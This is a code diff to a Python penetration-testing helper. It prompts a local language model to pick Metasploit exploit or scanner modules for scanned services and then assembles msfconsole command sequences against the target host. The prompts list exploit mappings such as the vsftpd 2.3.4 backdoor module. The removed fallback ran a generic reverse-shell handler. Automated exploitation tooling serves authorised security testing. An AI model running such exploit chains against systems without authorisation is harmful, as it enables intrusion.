@@ -69,29 +69,57 @@ class LocalAISystem:
         port = service_data.get('port', 'unknown')
         host = service_data.get('host', 'unknown')
         
-        prompt = f"""You are a penetration testing expert. Analyze this service and recommend the EXACT Metasploit module path.
+        prompt = f"""You are a cybersecurity expert. Analyze this network service and determine if there are known Metasploit modules for it.
 
-Service Information:
-- Service: {service}
-- Product: {product}
-- Version: {version}
-- Port: {port}
-- Host: {host}
+TARGET SERVICE:
+Service: {service}
+Product: {product} 
+Version: {version}
+Port: {port}
 
-Common exploit patterns:
-- vsftpd 2.3.4 → exploit/unix/ftp/vsftpd_234_backdoor
-- Samba 3.0.20 → exploit/linux/samba/lsa_transnames_heap  
-- Apache 2.2.x → exploit/linux/http/apache_mod_rewrite_ldap
-- OpenSSH < 7.4 → exploit/linux/ssh/libssh_auth_bypass
-- ProFTPD 1.3.x → exploit/linux/ftp/proftp_sreplace
-- MySQL 5.x → exploit/linux/mysql/mysql_yassl_hello
+ANALYSIS STEPS:
+1. What type of service is this? (FTP, HTTP, SSH, SMB, etc.)
+2. Are there known vulnerabilities for this specific product/version?
+3. What would be the appropriate Metasploit module category?
 
-Respond with ONLY valid JSON (no markdown, no explanations):
+METASPLOIT MODULE CATEGORIES:
+- exploit/: Remote code execution vulnerabilities
+- auxiliary/scanner/: Information gathering and enumeration  
+- auxiliary/dos/: Denial of service attacks
+- post/: Post-exploitation modules
+
+CRITICAL THINKING:
+- For well-known exploits (like vsftpd 2.3.4 backdoor), suggest the actual exploit module
+- If you don't know of a specific exploit, suggest scanner modules for enumeration
+- If the service is completely unknown, return MODULE_NOT_AVAILABLE
+- Don't make up module names - be conservative but don't be overly cautious about famous exploits
+
+WELL-KNOWN EXPLOITS (these are safe to suggest):
+- vsftpd 2.3.4 backdoor → exploit/unix/ftp/vsftpd_234_backdoor
+- SSH enumeration → auxiliary/scanner/ssh/ssh_version  
+- HTTP enumeration → auxiliary/scanner/http/http_version
+- FTP enumeration → auxiliary/scanner/ftp/ftp_version
+
+EXAMPLE ANALYSIS:
+Service: ssh, Product: openssh, Version: 8.0
+→ This is SSH service. No known RCE exploits for this version.
+→ Appropriate response: auxiliary/scanner/ssh/ssh_version for enumeration
+
+Service: ftp, Product: vsftpd, Version: 2.3.4  
+→ This is FTP service. vsftpd 2.3.4 has a FAMOUS backdoor vulnerability.
+→ Appropriate response: exploit/unix/ftp/vsftpd_234_backdoor (this exploit definitely exists)
+
+Service: unknown-service, Product: unknown, Version: 1.0
+→ This is an unknown service with no vulnerability information.
+→ Appropriate response: MODULE_NOT_AVAILABLE
+
+Now analyze the target service above and respond with JSON:
 {{
-    "exploit_module": "exploit/category/service/specific_module",
-    "payload": "payload/platform/type", 
-    "confidence": "high|medium|low",
-    "reasoning": "brief technical explanation",
+    "exploit_module": "specific_module_path_or_MODULE_NOT_AVAILABLE",
+    "payload": "appropriate_payload_or_NO_PAYLOAD",
+    "vulnerability_type": "RCE|DOS|INFO_DISCLOSURE|AUTH_BYPASS|OTHER",
+    "confidence": "high|medium|low", 
+    "reasoning": "step_by_step_analysis_of_your_decision",
     "target_info": {{
         "RHOSTS": "{host}",
         "RPORT": {port}
@@ -110,7 +138,7 @@ Respond with ONLY valid JSON (no markdown, no explanations):
                 options={
                     'temperature': 0.1,  # Low temperature for consistent results
                     'top_p': 0.9,
-                    'num_predict': 300   # Limit response length
+                    'num_predict': 400   # Slightly longer for better reasoning
                 }
             )
             
@@ -133,39 +161,145 @@ Respond with ONLY valid JSON (no markdown, no explanations):
                 else:
                     raise ValueError("No valid JSON found in response")
             
-            # Build command sequence
-            exploit_module = result.get('exploit_module', 'exploit/multi/handler')
-            payload = result.get('payload', 'payload/generic/shell_reverse_tcp')
+            # Validate the response
+            exploit_module = result.get('exploit_module', 'MODULE_NOT_AVAILABLE')
+            payload = result.get('payload', 'NOT_APPLICABLE')
+            vuln_type = result.get('vulnerability_type', 'OTHER')
             
-            commands = [
-                f"use {exploit_module}",
-                f"set RHOSTS {host}",
-                f"set RPORT {port}"
-            ]
+            # Basic validation - reject obviously invalid responses
+            if "exact_metasploit_module_path_or_MODULE_NOT_AVAILABLE" in exploit_module or "module_name_here" in exploit_module or "specific_module_path_or_MODULE_NOT_AVAILABLE" in exploit_module:
+                print(f"⚠️ AI responded with template text: {exploit_module}")
+                print(f"🔄 Overriding to MODULE_NOT_AVAILABLE")
+                exploit_module = 'MODULE_NOT_AVAILABLE'
+                vuln_type = 'OTHER'
+                result['reasoning'] = f"AI provided template response instead of actual module"
             
-            if payload and payload != "":
-                commands.append(f"set payload {payload}")
+            # Validate module path format
+            elif exploit_module != 'MODULE_NOT_AVAILABLE' and not (
+                exploit_module.startswith('exploit/') or 
+                exploit_module.startswith('auxiliary/') or 
+                exploit_module.startswith('post/')
+            ):
+                print(f"⚠️ AI suggested invalid module format: {exploit_module}")
+                print(f"🔄 Overriding to MODULE_NOT_AVAILABLE")
+                exploit_module = 'MODULE_NOT_AVAILABLE'
+                vuln_type = 'OTHER'
+                result['reasoning'] = f"Invalid module path format: {exploit_module}"
+            
+            # Validate that service type matches suggested module (basic sanity check)
+            elif exploit_module != 'MODULE_NOT_AVAILABLE':
+                service_lower = service.lower()
                 
-            # Add common options
-            commands.extend([
-                "set LHOST YOUR_IP",
-                "set LPORT 4444",
-                "check",
-                "exploit"
-            ])
+                # Check for obvious mismatches
+                if 'ftp' in exploit_module and service_lower not in ['ftp']:
+                    print(f"⚠️ AI suggested FTP module for non-FTP service: {service}")
+                    print(f"🔄 Overriding to MODULE_NOT_AVAILABLE")
+                    exploit_module = 'MODULE_NOT_AVAILABLE'
+                    vuln_type = 'OTHER'
+                    result['reasoning'] = f"FTP module suggested for {service} service - mismatch"
+                
+                elif 'ssh' in exploit_module and service_lower not in ['ssh']:
+                    print(f"⚠️ AI suggested SSH module for non-SSH service: {service}")
+                    print(f"🔄 Overriding to MODULE_NOT_AVAILABLE")
+                    exploit_module = 'MODULE_NOT_AVAILABLE'
+                    vuln_type = 'OTHER'
+                    result['reasoning'] = f"SSH module suggested for {service} service - mismatch"
+                
+                elif 'http' in exploit_module and service_lower not in ['http', 'https', 'web']:
+                    print(f"⚠️ AI suggested HTTP module for non-HTTP service: {service}")
+                    print(f"🔄 Overriding to MODULE_NOT_AVAILABLE")
+                    exploit_module = 'MODULE_NOT_AVAILABLE'
+                    vuln_type = 'OTHER'
+                    result['reasoning'] = f"HTTP module suggested for {service} service - mismatch"
+            
+            # Handle case where no module is available
+            if exploit_module == 'MODULE_NOT_AVAILABLE':
+                print(f"⚠️ No specific Metasploit module available for this vulnerability")
+                return {
+                    "exploit_module": "MODULE_NOT_AVAILABLE",
+                    "payload": "NOT_APPLICABLE",
+                    "vulnerability_type": vuln_type,
+                    "confidence": "high",
+                    "reasoning": "No specific Metasploit module exists for this vulnerability type/version combination",
+                    "target_info": {
+                        "RHOSTS": host,
+                        "RPORT": port
+                    },
+                    "commands": [
+                        "# No Metasploit module available for this vulnerability",
+                        "# Consider manual exploitation or alternative tools",
+                        f"# Target: {host}:{port} ({service} {product} {version})"
+                    ],
+                    "ai_source": 'local_ollama',
+                    "model_used": self.exploit_model
+                }
+            
+            # Build appropriate command sequence based on module type
+            commands = []
+            
+            if exploit_module.startswith('auxiliary/'):
+                # Auxiliary modules (DOS, scanners, etc.)
+                commands = [
+                    f"use {exploit_module}",
+                    f"set RHOSTS {host}",
+                    f"set RPORT {port}",
+                    "run"
+                ]
+                # Auxiliary modules shouldn't have payloads, but don't warn for expected values
+                if payload and payload not in ["NO_PAYLOAD", "NOT_APPLICABLE", "N/A", "", "payload/platform/type OR NO_PAYLOAD OR NOT_APPLICABLE"]:
+                    print(f"⚠️ Warning: Auxiliary module shouldn't have payload, but AI suggested: {payload}")
+                    
+            elif exploit_module.startswith('exploit/'):
+                # Exploit modules (RCE, etc.)
+                commands = [
+                    f"use {exploit_module}",
+                    f"set RHOSTS {host}",
+                    f"set RPORT {port}"
+                ]
+                
+                if payload and payload != "NO_PAYLOAD" and payload != "NOT_APPLICABLE":
+                    commands.append(f"set payload {payload}")
+                    commands.extend([
+                        "set LHOST YOUR_IP",
+                        "set LPORT 4444"
+                    ])
+                
+                commands.extend([
+                    "check",
+                    "exploit"
+                ])
+            else:
+                # Unknown module type
+                commands = [
+                    f"use {exploit_module}",
+                    f"set RHOSTS {host}",
+                    f"set RPORT {port}",
+                    "run"
+                ]
             
             result['commands'] = commands
             result['ai_source'] = 'local_ollama'
             result['model_used'] = self.exploit_model
             
-            print(f"✅ Local AI result: {exploit_module}")
+            # Log the result with vulnerability type
+            vuln_type_emoji = {
+                'RCE': '💥',
+                'DOS': '💣', 
+                'INFO_DISCLOSURE': '🔍',
+                'AUTH_BYPASS': '🔓',
+                'PRIVILEGE_ESCALATION': '⬆️',
+                'OTHER': '❓'
+            }.get(vuln_type, '❓')
+            
+            print(f"✅ AI result: {exploit_module} {vuln_type_emoji} ({vuln_type})")
             return result
             
         except Exception as e:
             print(f"❌ Local AI Error: {e}")
             return {
-                "exploit_module": "exploit/multi/handler",
-                "payload": "payload/generic/shell_reverse_tcp",
+                "exploit_module": "ERROR_OCCURRED",
+                "payload": "NOT_APPLICABLE",
+                "vulnerability_type": "ERROR",
                 "confidence": "low",
                 "reasoning": f"Local AI error: {str(e)}",
                 "target_info": {
@@ -173,13 +307,11 @@ Respond with ONLY valid JSON (no markdown, no explanations):
                     "RPORT": port
                 },
                 "commands": [
-                    "use exploit/multi/handler",
-                    f"set RHOSTS {host}",
-                    f"set RPORT {port}",
-                    "set payload payload/generic/shell_reverse_tcp",
-                    "exploit"
+                    "# AI analysis failed",
+                    f"# Target: {host}:{port} ({service} {product} {version})",
+                    "# Manual analysis required"
                 ],
-                "ai_source": "fallback",
+                "ai_source": "error",
                 "error": str(e)
             }
 
